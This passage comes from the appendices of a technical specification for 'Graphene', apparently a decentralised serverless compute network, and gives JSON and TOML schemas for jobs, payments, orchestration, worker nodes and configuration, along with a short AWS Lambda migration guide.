  "kernel": "python-3.11-unikraft",
  "entrypoint": "main.py",
  "resources": {
    "tier": "standard",
    "vcpu": 2,
    "memory_mb": 2048,
    "max_duration_ms": 60000
  },
  "network": {
    "egress_allowlist": ["api.openai.com", "*.amazonaws.com"]
  },
  "routing": {
    "required_regions": null,
    "preferred_regions": ["us-west"],
    "max_latency_ms": null
  },
  "result": {
    "max_size_mb": 50,
    "webhook_url": null
  },
  "assets": {
    "requirements_hash": "blake3:abc...",
    "requirements_url": "iroh:blob/abc...",
    "code_hash": "blake3:def...",
    "code_url": "iroh:blob/def...",
    "input_hash": "blake3:ghi...",
    "input_url": "iroh:blob/ghi..."
  }
}
```

## Appendix B: Payment Ticket Schema

```json
{
  "channel_id": "base58-encoded-pda",
  "amount_micros": 50000,
  "nonce": 42,
  "timestamp": 1706900000,
  "signature": "base64-ed25519-signature"
}
```

## Appendix C: Orchestration Schema

```json
{
  "orchestration": {
    "mode": "dag",  // or "dynamic" or "single"

    "dag": {
      "jobs": {
        "<job_id>": {
          "code_hash": "blake3:...",
          "deps_hash": "blake3:...",
          "entrypoint": "main.py",
          "resources": {
            "vcpu": 2,
            "memory_mb": 2048,
            "max_duration_ms": 60000
          },
          "depends_on": ["<parent_job_id>"],
          "input_from": "<parent_job_id> | <parent_job_id>.field"
        }
      },
      "entry": "<starting_job_id>",
      "affinity": {
        "default": "same_worker | same_region | distributed",
        "<job_id>": "same_worker | same_region | distributed"
      }
    },

    "spawn_limits": {
      "max_depth": 3,
      "max_total_jobs": 50,
      "max_spawn_budget_usdc": 10.0
    }
  }
}
```

## Appendix D: Worker Announcement Schema

```json
{
  "node_id": "ed25519:base58...",
  "version": "0.1.0",
  "capabilities": {
    "tiers": ["standard", "compute"],
    "max_vcpu": 16,
    "max_memory_mb": 65536,
    "gpu": null,
    "kernels": ["python-3.11-unikraft", "node-20-unikraft"]
  },
  "regions": ["us-west-2"],
  "coordinates": [45.52, -122.67],
  "pricing": {
    "cpu_ms_micros": 1,
    "memory_mb_ms_micros": 0.1,
    "egress_mb_micros": 10000
  },
  "stake": {
    "amount": 1000,
    "locked_until": null
  },
  "reputation": {
    "success_rate": 0.997,
    "jobs_completed": 50000,
    "p50_latency_ms": 180,
    "p99_latency_ms": 450
  }
}
```

## Appendix E: Migration from AWS Lambda

| AWS Lambda Concept | Graphene Equivalent |
|--------------------|---------------------|
| `handler.py` / handler function | `entrypoint` in manifest |
| `requirements.txt` | `RUN pip install` in Dockerfile |
| Event JSON | Input blob (via `input_url`) |
| Return value | stdout or result blob |
| Environment variables | Build-time `ARG` in Dockerfile |
| VPC / Security Groups | `egress_allowlist` in manifest |
| Layers | Multi-stage Dockerfile + L2 cache |
| Provisioned Concurrency | Pre-warmed workers (same effect via caching) |
| Step Functions | DAG orchestration mode |
| CloudWatch Logs | stdout/stderr in result blob |

**Key Differences:**

1. **No runtime package installation.** All dependencies must be in the Dockerfile. This is more secure but requires upfront declaration.

2. **No persistent filesystem.** Jobs are stateless. Use input/output blobs for data passing.

3. **Explicit network allowlist.** Unlike Lambda VPCs which allow all egress by default, Graphene blocks all egress unless explicitly allowlisted.

4. **Payment model.** Pay-per-use via payment channels instead of AWS billing. No minimum charges or reserved capacity fees.

**Example Migration:**

```python
# AWS Lambda
def handler(event, context):
    import pandas as pd
    df = pd.read_csv(event['s3_path'])
    return {"row_count": len(df)}

# Graphene Dockerfile
FROM python:3.11-slim-unikraft
RUN pip install pandas
COPY handler.py /app/
CMD ["python", "/app/handler.py"]

# Graphene handler.py
import json
import pandas as pd

def main():
    with open("/input/data.csv") as f:
        df = pd.read_csv(f)
    print(json.dumps({"row_count": len(df)}))

if __name__ == "__main__":
    main()
```

## Appendix F: Node Configuration Schema

Complete TOML schema for Graphene node configuration, managed via `graphenectl apply`.

```toml
# node-config.toml
# Graphene Node Configuration Schema v1.0

# Schema version (required)
version = "1.0"

# Node identity
[node]
# Human-readable name (optional, for operator reference)
name = "worker-us-west-01"
# Geographic region for routing
region = "us-west-2"
# Coordinates for latency estimation [lat, lon]
coordinates = [45.52, -122.67]

# Resource allocation
[resources]
# Maximum vCPUs available for jobs
max_vcpu = 16
# Maximum memory in MB
max_memory_mb = 65536
# Maximum concurrent jobs
max_concurrent_jobs = 8
# Supported job tiers
tiers = ["standard", "compute"]

# Staking configuration
[staking]
# Solana wallet address (base58)
wallet = "GrPhN3..."
# Minimum stake to maintain (in $GRAPHENE)
min_stake = 1000
# Auto-compound rewards
auto_compound = true

# Pricing (in micro-USDC)
[pricing]
# Per vCPU-millisecond
cpu_ms = 1
# Per MB-millisecond of memory
memory_mb_ms = 0.1
# Per MB of egress
egress_mb = 10000

# Network configuration
[network]
# Iroh relay servers (optional, uses defaults if empty)
relay_servers = []
# Gossip topic (do not change unless instructed)
gossip_topic = "graphene-compute-v1"

# Listen addresses
[network.listen]
# Management API port
management = 9090
# Prometheus metrics port
metrics = 9091
# P2P port (Iroh)
p2p = 4433

# Firecracker MicroVM configuration
[vmm]
# Path to kernel binary
kernel_path = "/var/lib/graphene/vmlinux"
# Default rootfs for unikernels
rootfs_path = "/var/lib/graphene/rootfs.ext4"
# VM boot timeout in milliseconds
boot_timeout_ms = 5000
# Enable jailer for additional isolation
jailer_enabled = true
# Jailer UID/GID range start
jailer_uid_start = 10000

# Builder VM configuration
[builder]
# Enable ephemeral builder VMs
enabled = true
# Builder timeout in seconds
timeout_seconds = 300
# Maximum builder memory in MB
max_memory_mb = 4096
# Maximum builder disk in MB
max_disk_mb = 10240

# Cache configuration
[cache]
# Local cache directory
path = "/var/cache/graphene"
# Maximum cache size in GB
max_size_gb = 100
# Enable P2P cache sharing via Iroh
p2p_enabled = true
# Cache TTL in hours (0 = infinite)
ttl_hours = 168  # 7 days

# Logging configuration
[logging]
# Log level: trace, debug, info, warn, error
level = "info"
# Log format: json, pretty
format = "json"
# Log output: stdout, file, both
output = "both"
# Log file path (if output includes file)
file_path = "/var/log/graphene/worker.log"

# Log rotation
[logging.rotation]
max_size_mb = 100
max_files = 10

# Security configuration
[security]
# Require TLS for management API
tls_required = true
# TLS certificate path (auto-generated if not specified)
tls_cert_path = "/etc/graphene/tls/cert.pem"
tls_key_path = "/etc/graphene/tls/key.pem"

# Capability token settings
[security.capability]
# Token expiry in hours (0 = no expiry)
expiry_hours = 720  # 30 days
# Allowed roles
allowed_roles = ["admin", "operator", "reader"]

# Attestation configuration (for hardened nodes)
[attestation]
# Enable TPM-based attestation
tpm_enabled = true
# TPM device path
tpm_device = "/dev/tpmrm0"
# Enable dm-verity verification
verity_enabled = true
# Expected dm-verity root hash (set during build)
# verity_root_hash = "sha256:..."

# Maintenance windows
[maintenance]
# Automatic updates enabled
auto_update = false
# Drain timeout before forced shutdown (seconds)
drain_timeout = 300

# Preferred update window (UTC)
[maintenance.update_window]
start = "04:00"
end = "06:00"
```

**Configuration Validation Rules:**

| Field | Validation |
|-------|------------|
| `version` | Must be "1.0" |
| `node.region` | Must match pattern `[a-z]+-[a-z]+-[0-9]+` |
| `resources.max_vcpu` | 1-128, must not exceed host CPU count |
| `resources.max_memory_mb` | 512-524288, must not exceed host RAM |
| `staking.wallet` | Valid Solana base58 address |
| `pricing.*` | Non-negative integers |
| `network.listen.*` | Valid port numbers (1024-65535) |
| `vmm.boot_timeout_ms` | 1000-30000 |
| `cache.max_size_gb` | 1-1000 |
| `logging.level` | One of: trace, debug, info, warn, error |

**Example: Minimal Configuration**

```toml
version = "1.0"

[node]
region = "us-west-2"

[resources]
max_vcpu = 8
max_memory_mb = 32768

[staking]
wallet = "GrPhN3exampleWallet..."

[pricing]
cpu_ms = 1
memory_mb_ms = 0.1
egress_mb = 10000
```

All other fields use secure defaults when not specified.

---

*For technical questions: developers@graphene.network*
*For partnerships: partners@graphene.network*
